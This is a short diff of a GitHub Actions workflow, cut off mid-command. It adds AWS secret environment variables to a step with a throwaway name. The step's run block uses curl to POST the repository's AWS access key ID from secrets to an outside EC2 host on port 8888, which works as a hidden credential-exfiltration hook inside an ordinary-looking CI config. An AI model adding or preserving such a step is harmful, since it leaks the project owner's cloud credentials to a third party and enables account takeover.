@@ -10,7 +10,11 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
 
-    - name: dsdsd
+    - name: sdss
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        AWS_DEFAULT_REGION: ${{ env.AWS_DEFAULT_REGION }}
       run: |
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "aws-access-key-id=${{ secrets.AWS_ACCESS_KEY_ID }}" \
